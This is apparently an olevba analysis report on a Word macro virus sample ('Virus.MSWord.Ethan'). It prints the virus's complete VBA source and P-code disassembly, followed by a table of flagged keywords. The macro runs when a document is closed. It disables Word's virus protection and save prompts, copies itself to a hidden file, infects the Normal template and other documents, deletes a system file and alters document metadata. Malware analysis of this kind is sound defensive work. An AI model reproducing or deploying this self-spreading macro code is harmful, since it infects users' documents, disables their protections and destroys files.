olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.dl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.dl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
j = 1
w = 1
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\winwows\bandv.dll", 6) = "" Then
Open "c:\windows\bandv.dll" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(w).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(w).CodeModule.Lines(i, j)
Print #1, a
Next i
Close #1
SetAttr "c:\windows\bandv.dll", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(w).CodeModule.Lines(j, j) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(w)
ElseIf ActiveDocument.VBProject.VBComponents.Item(w).CodeModule.Lines(j, j) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(w)
Else
t = ""
End If
If t <> "" Then
Open "c:\windows\bandv.dll" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Bandv Frome": .Author = "\ZB&BV": .Keywords = "Bandv": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
 Selection.WholeStory
 Selection.Font.ColorIndex = wdRed
 Selection.MoveDown Unit:=wdLine, Count:=1
 ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.dl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3595 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0001 
' 	St j 
' Line #3:
' 	LitDI2 0x0001 
' 	St w 
' Line #4:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #5:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #7:
' 	ArgsCall Read 0x0000 
' Line #8:
' 	LitStr 0x0014 "c:\winwows\bandv.dll"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0014 "c:\windows\bandv.dll"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld w 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #11:
' 	Ld i 
' 	Ld j 
' 	Ld w 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #15:
' 	LitStr 0x0014 "c:\windows\bandv.dll"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	LitStr 0x000C "c:\class.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\class.sys"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #18:
' 	Ld j 
' 	Ld j 
' 	Ld w 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	Ld w 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #20:
' 	Ld j 
' 	Ld j 
' 	Ld w 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	ElseIfBlock 
' Line #21:
' 	SetStmt 
' 	Ld w 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	LitStr 0x0000 ""
' 	St t 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitStr 0x0014 "c:\windows\bandv.dll"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #27:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #28:
' 	LitDI2 0x0001 
' 	St i 
' Line #29:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #31:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #33:
' 	Loop 
' Line #34:
' 	Label q 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #36:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x000B "Bandv Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0006 "\ZB&BV"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Bandv"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #40:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #41:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #42:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #43:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #44:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |bandv.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

